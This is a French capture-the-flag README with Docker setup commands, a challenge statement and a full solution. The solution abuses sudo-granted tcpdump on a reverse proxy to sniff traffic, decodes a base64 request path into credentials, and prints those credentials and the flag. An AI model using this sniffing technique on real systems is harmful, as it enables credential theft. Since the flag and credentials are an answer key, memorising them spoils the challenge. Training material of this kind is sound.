# Challenge

# Infos lancement du docker
Commande pour build le docker :
sudo docker build -t explorer.eni.fr .

Commande pour lancer le docker :
sudo docker run -d --hostname explorer.eni.fr --name explorer.eni.fr -p 2222:22 -p 80:80 -p 8080:8080 -p 8000:8000 explorer.eni.fr

Changer les ports si besoins pour la partie hôte.

## Enonce

Un parchemin levisiteur.txt vous donne le premier accès à la machine à explorer le temps.

Le mot de passe de la machine à explorer le temps s'est perdu dans les couloirs du temps !
À vous de retrouver le mot de passe pour démarrer la machine.

http://explorer.eni.fr

Vous pouvez récupérer vos biens via http://explorer.eni.fr:8000/

## Solution

Via le fichier levisiteur.txt vous avez les identifiants ssh pour se connecter sur un reverse proxy Nginx avec un utilisateur non privilégié disposant d'un accès à tcpdump visible avec sudo -l.

Par déduction avec la catégorie et l'énoncé du challenge on devine que c'est une attaque type MITM il faut donc récupérer le flux du reverse proxy avec tcpdump :

Avec la commande suivante je vais créer un fichier PCAP : tcpdump -i any -s 65535 -w pcap.pcap

Recuperer le fichier pcap avec scp ou bien via http://explorer.eni.fr:8000

Avec Wireshark filtrer les requêtes avec "tcp.port == 80" on obtient plusieurs requête il fqut trouver la bonne qui est :

172.18.0.2 - - [27/Jan/2026:15:09:22 +0000] "GET /YXBpLnBocD91c2VybmFtZT1ldXNlYml1cyZwYXNzd29yZD03aFU2UG05cG85 HTTP/1.1" 200 39 "-" "curl/8.14.1"

Il faut ensuite décoder cette partie ave un décodeur base64 : YXBpLnBocD91c2VybmFtZT1ldXNlYml1cyZwYXNzd29yZD03aFU2UG05cG85

et on obtient :
/api.php?username=eusebius&password=7hU6Pm9po9

Cette requête affiche le mot de passe ainsi que la méthode à suivre pour obtenir le flag.

Attention : Une interface graphique est disponible via un lien, mais c'est un piège. Il faut impérativement interroger api.php via curl et non index.php en mode graphique.

Donc on fait utilise la commande curl ou un naviguateur web avec la requête suivante :
http://explorer.eni.fr/api.php?username=eusebius&password=7hU6Pm9po9

Le flag suivant sort :
ENI{Fl4g_LeC0uL0ir_Du_T3MPS}

## Hints

  - "https://www.rfc-editor.org/rfc/rfc7435.txt"
  - "https://developer.mozilla.org/fr/docs/Web/HTTP/Reference/Methods"
  - "https://fr.wikipedia.org/wiki/Vuln%C3%A9rabilit%C3%A9_des_services_d%27authentification_web"
